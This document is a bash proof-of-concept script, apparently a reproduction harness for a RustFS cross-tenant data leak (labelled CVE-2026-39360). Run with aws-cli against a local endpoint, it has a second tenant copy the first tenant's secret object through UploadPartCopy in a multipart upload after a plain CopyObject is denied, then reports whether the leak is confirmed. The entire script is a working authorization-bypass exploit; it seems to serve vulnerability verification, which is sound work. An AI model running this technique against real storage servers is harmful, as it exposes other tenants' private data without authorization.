#!/bin/bash
# AFG RustFS cross-tenant leak workload (CVE-2026-39360).
# Uses aws-cli v2 (s3api) against the local RustFS endpoint with path-style addressing.
set -u
AWS=~/rustfs_build/tools/aws-bin/aws
EP=http://127.0.0.1:9000
REG=us-east-1
OUT=~/rustfs_build/workload_out
rm -rf "$OUT"; mkdir -p "$OUT"
cd "$OUT"

# aws-cli v2: avoid flexible-checksum trailers some S3-compatible servers reject,
# and use path-style addressing for an IP endpoint.
export AWS_EC2_METADATA_DISABLED=true
export AWS_REQUEST_CHECKSUM_CALCULATION=when_required
export AWS_RESPONSE_CHECKSUM_VALIDATION=when_required
export AWS_DEFAULT_REGION=$REG
export AWS_CONFIG_FILE="$OUT/awsconfig"
export AWS_SHARED_CREDENTIALS_FILE="$OUT/awscreds"
cat > "$OUT/awsconfig" <<CFG
[profile a]
s3 =
    addressing_style = path
[profile b]
s3 =
    addressing_style = path
CFG
cat > "$OUT/awscreds" <<CRED
[a]
aws_access_key_id = userakey0001
aws_secret_access_key = userasecret0001
[b]
aws_access_key_id = userbkey0001
aws_secret_access_key = userbsecret0001
CRED

a(){ $AWS --profile a --endpoint-url $EP "$@"; }
b(){ $AWS --profile b --endpoint-url $EP "$@"; }

echo "================= STEP 1: A puts the secret into bucketa ================="
printf 'RUSTFS-SECRET-A-do-not-leak-0xCAFEBABE\n' > secret.txt
a s3api put-object --bucket bucketa --key secret.txt --body secret.txt
echo "--- A can read own object (sanity) ---"
a s3api get-object --bucket bucketa --key secret.txt a_readback.txt && cat a_readback.txt

echo "================= STEP 2: B sanity - B is denied a direct GET of bucketa ================="
b s3api get-object --bucket bucketa --key secret.txt b_directget.txt; echo "exit=$?"

echo "================= STEP 3 (CONTROL): B plain CopyObject bucketa/secret.txt -> bucketb/control.txt (expect 403) ================="
b s3api copy-object --bucket bucketb --key control.txt --copy-source bucketa/secret.txt; echo "copy-object exit=$?"

echo "================= STEP 4 (EXPLOIT): B UploadPartCopy of bucketa/secret.txt into B's multipart upload in bucketb ================="
UP=$(b s3api create-multipart-upload --bucket bucketb --key stolen.txt --query UploadId --output text)
echo "UploadId=$UP"
echo "--- upload-part-copy (copy-source = bucketa/secret.txt) ---"
b s3api upload-part-copy --bucket bucketb --key stolen.txt --part-number 1 --upload-id "$UP" --copy-source bucketa/secret.txt --output json | tee upc.json
ETAG=$(python3 -c "import json;print(json.load(open('upc.json'))['CopyPartResult']['ETag'].strip('\"'))")
echo "part ETag=$ETAG"
echo "--- complete-multipart-upload ---"
b s3api complete-multipart-upload --bucket bucketb --key stolen.txt --upload-id "$UP" \
   --multipart-upload "{\"Parts\":[{\"PartNumber\":1,\"ETag\":\"$ETAG\"}]}"; echo "complete exit=$?"
echo "--- B GETs the result object from its own bucketb ---"
b s3api get-object --bucket bucketb --key stolen.txt b_stolen.txt; echo "get exit=$?"
echo "--- contents B received ---"
cat b_stolen.txt 2>/dev/null
echo "================= RESULT CHECK ================="
if grep -q 'RUSTFS-SECRET-A' b_stolen.txt 2>/dev/null; then
  echo "LEAK CONFIRMED: B obtained A's secret via UploadPartCopy"
else
  echo "NO LEAK: B did not obtain A's secret"
fi
echo "workload done"
